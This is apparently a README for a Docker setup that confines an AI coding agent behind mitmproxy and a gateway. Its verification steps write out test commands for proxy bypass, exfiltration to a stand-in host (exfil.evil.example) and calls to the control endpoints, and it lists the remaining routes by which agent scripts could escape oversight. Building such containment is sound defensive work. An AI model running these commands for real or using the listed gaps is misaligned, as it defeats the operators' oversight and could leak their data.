# Docker layout for the row 6 gap

> **UNVERIFIED: written on 2026-11-07 without Docker or network.** None of
> the files in this directory has been run. `tests/test_docker_layout.py`
> only checks that the files say what this page says. Run the commands in
> [Verify](#verify) before you rely on any of it.

Row 6 is the known gap of the harness: a script the agent runs
(`python x.py`, `npm test`) can open its own sockets, and the proxy only sees
programs that honor the `*_PROXY` variables. This layout runs the agent in a
container whose only network exit is mitmproxy, so a script that ignores the
proxy has nowhere to go.

## Layout

| Service | Networks | Mounts | Role |
|---|---|---|---|
| `gateway` | `agentnet`, `egress` | repo read-only at `/harness`; workspace read-only at `/workspace`; `$A10_HOME/operator.token` read-only at `/a10/operator.token`; volume `a10-audit` at `/data` | `gateway.py` judging hook calls and proxy requests. Publishes only `127.0.0.1:8000` so the console on your machine can reach it |
| `mitm` | `agentnet`, `egress` | repo read-only; volume `mitm-conf` (CA key and cert); volume `mitm-ca` (public cert only) | `mitmdump` with `mitm_addon.py`; the agent's only way out |
| `agent` | `agentnet` only | workspace read-write at `/workspace`; `oh-settings.json` read-only as oh's `settings.json`; `mitm-ca` read-only | `oh --permission-mode full_auto` as a non-root user with all capabilities dropped. No operator token, no `docker.sock` |

`agentnet` is `internal: true`: Docker gives it no route out. `egress` is a
normal bridge network. The gateway is on `egress` only because Docker needs a
non-internal network to publish a port; it makes no outbound calls.

Files: `compose.yml` (the services above), `Dockerfile.agent` (Python 3.11
slim, `pip install openharness-ai`, user `agent`, entrypoint
`oh --permission-mode full_auto`), `oh-settings.json` (the gateway hooks,
generated by `python3 oh_setup.py --print-hooks --gateway-url
http://gateway:8000 > docker/oh-settings.json`).

## What it should guarantee

These are the design goals. The [Verify](#verify) checks test each one.

- **No direct connections.** The agent container has no route out of Docker.
  A script that opens its own socket, or a client that ignores `*_PROXY`
  (Node's built-in `fetch`, `curl --noproxy '*'`), fails with "Network is
  unreachable" or a DNS error.
- **No external DNS.** On an internal network Docker's embedded DNS answers
  for the service names (`gateway`, `mitm`) but should not resolve outside
  names, so a lookup cannot carry data out either. Some Docker Engine
  versions have forwarded outside lookups from internal networks; check 3
  shows which behavior your engine has.
- **Everything that leaves goes through mitm**, which asks the gateway before
  it opens the upstream connection (rows 8, 9, 10, 19 and 20) and answers 403
  when the gateway is down.
- **The agent cannot reach the controls.** The operator token is never in
  the agent container, so `/stop`, `/approve`, `/mode`, `/override` and
  `/reset` answer 401. The gateway and mitm run in other containers, so the
  agent cannot see or kill their processes (row 18).
- **The hooks stay on.** oh's `settings.json` is mounted read-only, so not
  even a script can remove the gateway hooks.
- **oh's `web_fetch` and `web_search` fail instead of bypassing the proxy.**
  They ignore `*_PROXY`, so here they have no route at all. The gateway still
  judges them at the tool level first.

## Run it

You need Docker with Compose v2 (`docker compose`) and network access to
pull the images and build the agent image. From the repo root:

```bash
export A10_HOME="$HOME/.a10-harness"
python3 -c 'import harness; harness.ensure_operator_token(harness.a10_home())'
export ANTHROPIC_API_KEY=...            # see Settings for other providers
docker compose -f docker/compose.yml up --build -d gateway mitm
python3 harness.py watch                # second terminal: approvals, stop, mode
docker compose -f docker/compose.yml run --rm agent                       # interactive oh
docker compose -f docker/compose.yml run --rm agent -p "list the files"   # one prompt
```

`docker compose -f docker/compose.yml up --build` also works. It starts all
three services, and `docker attach a10-harness-agent-1` connects you to oh's
terminal. The dashboard is `http://127.0.0.1:8000/#token=<token>`, with the
token from `$A10_HOME/operator.token`; `docker compose -f docker/compose.yml
logs gateway` also prints the URL.

**Stopping.** `s` in the console stops the run: the gateway answers every
later tool call and proxied request with "stopped". Unlike `harness.py oh`,
the gateway cannot kill the agent, because it has no access to Docker (on
purpose). Exit oh yourself, or find the container with
`docker ps --filter name=a10-harness-agent` and `docker stop` it.
`docker compose -f docker/compose.yml down` stops the gateway and mitm.

**Audit log.** It lives in the `a10-audit` volume:

```bash
docker compose -f docker/compose.yml cp gateway:/data/audit.log.jsonl ./audit-docker.jsonl
python3 harness.py verify ./audit-docker.jsonl
```

### Settings

Environment variables that `compose.yml` reads from your shell:

| Variable | Default | Meaning |
|---|---|---|
| `A10_HOME` | required | Host directory holding `operator.token`, the same one `harness.py watch` uses |
| `A10_WORKSPACE` | `../demo-files` | Host directory mounted at `/workspace`. Relative paths are relative to `docker/`; an absolute path is clearer |
| `A10_MODE` | `default` | Starting mode: `plan`, `default` or `auto` |
| `A10_PROVIDER_HOST` | `api.anthropic.com` | The row 10 host. It must match the provider oh uses, or the LLM calls become row 9 asks |
| `A10_DEMO_STUBS` | `0` | `1` makes mitm serve the offline `api.example.com` stubs |
| `A10_MITMPROXY_TAG` | `11.1.3` | Tag of the `mitmproxy/mitmproxy` image (not checked against Docker Hub) |
| `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `OPENHARNESS_PROFILE` | unset | Passed to the agent only when set in your shell |

oh in the container starts without your `~/.openharness`, so it uses its
default profile (`claude-api`) unless you set `OPENHARNESS_PROFILE` or add
`active_profile` and `profiles` to `oh-settings.json` (the tests only check
its `hooks` key). Whether oh picks up `ANTHROPIC_API_KEY` from the
environment is not verified. Subscription logins (Claude, Codex, Copilot) are
not set up in this layout.

## Verify

Run these from the repo root with `gateway` and `mitm` up and
`python3 harness.py watch` open. Each line says what must happen.

1. The file parses (and `A10_HOME` is set):
   `docker compose -f docker/compose.yml config --quiet` exits 0.
2. A direct socket fails:
   ```bash
   docker compose -f docker/compose.yml run --rm --entrypoint python3 agent \
     -c "import socket; socket.create_connection(('1.1.1.1', 443), 3)"
   ```
   must end in `OSError` (for example `Network is unreachable`). With the
   agent running from `up`, the same check is
   `docker compose -f docker/compose.yml exec agent python3 -c "import socket; socket.create_connection(('1.1.1.1', 443), 3)"`.
3. Outside names do not resolve:
   `docker compose -f docker/compose.yml run --rm --entrypoint getent agent hosts example.com`
   prints nothing and exits non-zero, while
   `docker compose -f docker/compose.yml run --rm --entrypoint getent agent hosts gateway`
   prints an address.
4. A client that ignores the proxy fails:
   `docker compose -f docker/compose.yml run --rm --entrypoint curl agent --noproxy '*' -sS -m 5 https://example.com`
   fails.
5. A proxied request shows up in the console:
   `docker compose -f docker/compose.yml run --rm --entrypoint curl agent -s https://example.com`
   appears as a NET event from `proxy-mitm` (a row 9 ask in default mode).
   Approve it with `a` and curl prints the page, which also shows that the
   agent trusts the mitm CA.
6. Exfiltration is blocked:
   `docker compose -f docker/compose.yml run --rm --entrypoint curl agent -s -X POST -d x https://exfil.evil.example/u`
   prints the 403 JSON with row 20.
7. No token and no Docker socket in the agent:
   `docker compose -f docker/compose.yml run --rm --entrypoint sh agent -c 'ls -A /a10; ls /var/run/docker.sock; env | grep -ci token'`
   lists only `mitm-ca` and `oh-config`, reports that `docker.sock` does not
   exist, and prints `0`. And
   `docker compose -f docker/compose.yml run --rm --entrypoint curl agent -s -o /dev/null -w '%{http_code}\n' -X POST http://gateway:8000/stop`
   prints `401`.
8. The host is not reachable directly:
   `docker compose -f docker/compose.yml run --rm --entrypoint curl agent --noproxy '*' -sS -m 5 http://host.docker.internal:8000/status`
   fails.
9. The hooks work (needs a provider key):
   `docker compose -f docker/compose.yml run --rm agent -p "Run rm notes.txt"`
   shows `⛔ BLOCK [row 28]` in the console, and the workspace's `notes.txt`
   still exists.
10. The audit log copied out as in "Run it" passes `python3 harness.py verify`.

When all ten pass, update "Verification status" in the main README and
remove the banner at the top of this page.

## What is still trusted, and what this does not fix

- **The gateway and mitm containers and their images** (`python:3.11-slim`,
  `mitmproxy/mitmproxy`). They have network access and run as root inside
  their containers. So do the Docker daemon and, on macOS, Docker Desktop's
  VM.
- **The bind-mounted workspace.** The agent can write anything in it. A
  script can create files that run later on your machine (row 23:
  `.git/hooks`, `.envrc`, `.vscode/tasks.json`) without a tool call. Check
  the workspace before you run anything from it outside the container.
- **Reads inside the container.** A script can still read everything the
  container holds, including the provider API key in its environment. It can
  only send data through mitm, so only to hosts the gateway allows. The row
  10 provider host is allowed, so a script could still send data there (for
  example with another account's API key).
- **The egress network.** mitm can reach whatever that network reaches,
  including your LAN. The gateway treats private addresses such as
  `192.168.1.1` as unknown hosts (rows 9 and 20), not as row 19, so auto mode
  allows a clean GET to one. `host.docker.internal` is row 19.
- **Raw TCP in a CONNECT tunnel** is judged by host only (the addon's TCP
  hooks), and those hooks have not been run against real mitmproxy.

## Notes

- The agent trusts only the mitm CA: `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`,
  `CURL_CA_BUNDLE` and `NODE_EXTRA_CA_CERTS` point at it alone, because every
  TLS connection the agent makes ends at mitm. mitm checks upstream
  certificates against its own trust store.
- The CA private key stays in the `mitm-conf` volume. mitm copies only the
  public certificate into `mitm-ca` for the agent.
- The operator token is mounted read-only. Keep it at mode 0600 (harness.py
  creates it that way): the gateway tightens a wider mode at start, and that
  fails on a read-only mount.
- On Linux the agent runs as uid 1000. If your workspace belongs to another
  uid, oh cannot write to it. Docker Desktop on macOS maps ownership for you.
- The build fetches packages from the network. Pin `openharness-ai` and the
  image tags before you use this for more than a demo.
